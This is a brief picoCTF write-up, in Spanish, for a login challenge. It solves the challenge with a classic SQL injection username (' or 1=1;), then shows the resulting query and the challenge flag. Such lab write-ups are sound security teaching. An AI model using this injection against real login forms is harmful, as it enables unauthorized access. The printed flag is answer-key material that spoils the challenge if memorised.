## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
- Cuando intentamos ingresar nos muestra tanto los datos de nuestro registro como la sentencia SQL que utiliza.
- Modificamos el registro para que nos logre ingresar y así nos muestra la bandera.

```shell
username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```

## Notas adicionales


## Referencias